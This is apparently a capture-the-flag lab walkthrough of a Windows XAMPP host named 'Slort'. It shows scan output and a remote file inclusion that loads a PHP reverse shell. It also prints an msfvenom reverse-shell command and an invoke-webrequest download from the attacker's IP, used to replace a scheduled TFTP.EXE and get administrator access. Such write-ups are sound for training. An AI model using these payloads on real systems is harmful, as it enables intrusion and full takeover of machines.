# Slort
### Enumeration
```
# Nmap 7.92 scan initiated Mon Apr 25 18:51:56 2022 as: nmap -sCV -v -oA nmap/tcp_1000 192.168.198.53
Nmap scan report for ip-192-168-198-53.eu-west-1.compute.internal (192.168.198.53)
Host is up (0.014s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst:
|_  SYST: UNIX emulated by FileZilla
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3306/tcp open  mysql?
| fingerprint-strings:
|   NULL:
|_    Host '192.168.49.198' is not allowed to connect to this MariaDB server
4443/tcp open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://ip-192-168-198-53.eu-west-1.compute.internal:4443/dashboard/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
8080/tcp open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://ip-192-168-198-53.eu-west-1.compute.internal:8080/dashboard/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
|_http-open-proxy: Proxy might be redirecting requests
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.92%I=7%D=4/25%Time=6266EDD1%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.198'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-04-25T18:52:11
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr 25 18:52:49 2022 -- 1 IP address (1 host up) scanned in 53.50 seconds
```

##### FTP: 21
No anonymous/guest login allowed. It's FileZilla 0.9.41 beta - might be an exploit.

##### SMB: 445
No anonymous/guest login allowed.

##### 4443 and 8080
Both appear to be the same webserver. I ran gobuster and found `/site`:

```
$ cat gobuster.out | grep -v 403
/img                  (Status: 301) [Size: 345] [--> http://192.168.198.53:8080/img/]
/site                 (Status: 301) [Size: 346] [--> http://192.168.198.53:8080/site/]
/examples             (Status: 503) [Size: 1060]
/dashboard            (Status: 301) [Size: 351] [--> http://192.168.198.53:8080/dashboard/]
/IMG                  (Status: 301) [Size: 345] [--> http://192.168.198.53:8080/IMG/]
/Site                 (Status: 301) [Size: 346] [--> http://192.168.198.53:8080/Site/]
/Img                  (Status: 301) [Size: 345] [--> http://192.168.198.53:8080/Img/]
/Dashboard            (Status: 301) [Size: 351] [--> http://192.168.198.53:8080/Dashboard/]
/xampp                (Status: 301) [Size: 347] [--> http://192.168.198.53:8080/xampp/]
/SITE                 (Status: 301) [Size: 346] [--> http://192.168.198.53:8080/SITE/]
```

### Foothold

Visiting this URL, we get redirected to `http://192.168.198.53:4443/site/index.php?page=main.php`. I spun up a python webserver and tried to do RFI with `http://192.168.198.53:4443/site/index.php?page=http://192.168.49.198/test.php`, and saw a request to the python server. I copied a [PHP reverse shell](https://github.com/ivan-sincek/php-reverse-shell/) into the web root and set it to callback on port 4443. After starting a listener and refreshing the page, I got a shell as `slort\rupert`. We get the local flag from `rupert`'s desktop.

### Privilege Escalation
I found the following in `C:\xampp\passwords.txt`:

```
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ]

3) Mercury (not in the USB & lite version):

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser
   Password: wampp

4) WEBDAV:

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf

   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so

   Please do not forget to refresh the WEBDAV authentification (users and passwords).
```

None of the passwords worked for either `rupert` or `administrator`. There was a `C:\Backup` folder:

```
Directory: C:\backup


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/12/2020   7:45 AM          11304 backup.txt
-a----         6/12/2020   7:45 AM             73 info.txt
-a----         6/23/2020   7:49 PM          73802 TFTP.EXE
```

Looking at `info.txt`, we find:

```
Run every 5 minutes:
C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
```

I wondered if I had any permissions on this folder and could replace the executable with a reverse shell payload. I ran `whoami /groups`

```
GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

Then I used the below Powershell function to get permissions for the backup folder:

```powershell
function Get-Permissions ($folder) {
  (get-acl $folder).access | select `
		@{Label="Identity";Expression={$_.IdentityReference}}, `
		@{Label="Right";Expression={$_.FileSystemRights}}, `
		@{Label="Access";Expression={$_.AccessControlType}}, `
		@{Label="Inherited";Expression={$_.IsInherited}}, `
		@{Label="Inheritance Flags";Expression={$_.InheritanceFlags}}, `
		@{Label="Propagation Flags";Expression={$_.PropagationFlags}} | ft -auto
		}
```

```
get-permissions .

Identity                                               Right Access Inherited               Inheritance Flags Propagati
                                                                                                               on Flags
--------                                               ----- ------ ---------               ----------------- ---------
BUILTIN\Users                                    FullControl  Allow     False ContainerInherit, ObjectInherit      None
BUILTIN\Administrators                           FullControl  Allow      True ContainerInherit, ObjectInherit      None
NT AUTHORITY\SYSTEM                              FullControl  Allow      True ContainerInherit, ObjectInherit      None
BUILTIN\Users                    ReadAndExecute, Synchronize  Allow      True ContainerInherit, ObjectInherit      None
NT AUTHORITY\Authenticated Users         Modify, Synchronize  Allow      True                            None      None
NT AUTHORITY\Authenticated Users                  -536805376  Allow      True ContainerInherit, ObjectInherit ...itOnly
```

So we can modify the folder, and therefore replace `TFTP.exe`. Let's generate a payload:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.198 LPORT=4443  --platform windows -a x64 -f exe EXITFUNC=thread -o www/TFTP.exe
```

We weren't able to directly overwrite the executable, so I got the payload on the box using:

```powershell
invoke-webrequest -uri http://192.168.49.198/TFTP.exe -outfile tmp.exe
```

We also can't `mv tmp.exe tftp.exe` since windows doesn't let move to a path that already exists. So we `rm tftp.exe` (I had to wait for the scheduled service to stop, otherwise I got told the file was in use), then `mv tmp.exe tftp.exe`. Make sure you have a listener running, and you'll soon get a shell as `slort\administrator`!